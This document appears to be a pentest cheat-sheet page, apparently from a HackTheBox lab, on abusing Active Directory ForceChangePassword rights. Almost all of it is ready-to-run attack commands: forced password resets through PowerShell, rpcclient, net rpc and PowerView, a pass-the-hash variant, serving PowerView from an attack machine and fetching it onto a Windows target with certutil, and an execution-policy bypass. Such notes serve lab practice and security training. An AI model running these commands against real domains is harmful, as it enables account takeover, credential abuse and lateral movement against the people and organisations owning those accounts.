# ForceChangePassword rights

This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user.



<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## PowerShell

{% code overflow="wrap" %}
```powershell
$userIdentity = 'CN=Michael Williams,CN=Users,DC=administrator,DC=htb'

Set-ADAccountPassword -Identity $userIdentity -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```
{% endcode %}



## RPC&#x20;

<pre class="language-bash" data-title="rpcclient"><code class="lang-bash">rpcclient -U DOMAIN.COM/USER DC_IP

<strong>setuserinfo2 USER_TO_CHANGE_PASS 23 'NewPassword123!'
</strong></code></pre>

{% code title="Net" overflow="wrap" %}
```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

# Pass-the-Hash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```
{% endcode %}







## PowerView

Import powerview

{% code title="transfer PowerView" overflow="wrap" %}
```bash
# attack machine
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
python3 -m http.server 80

# target machine windows
certutil -urlcache -f http://IP/PowerView.ps1 PowerView.ps1
```
{% endcode %}

{% code title="Import PowerView" %}
```powershell
powershell -ep bypass
. .\PowerView.ps1
```
{% endcode %}



Now we can force change the micheal's password.

{% code title="Create Password" overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $SecPassword)

```
{% endcode %}

{% code title="Convert pswd in secure string" %}
```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```
{% endcode %}

{% code title="Set password to user" overflow="wrap" %}
```powershell
Set-DomainUserPassword -Identity <USER> -AccountPassword $UserPassword -Credential $Cred
```
{% endcode %}



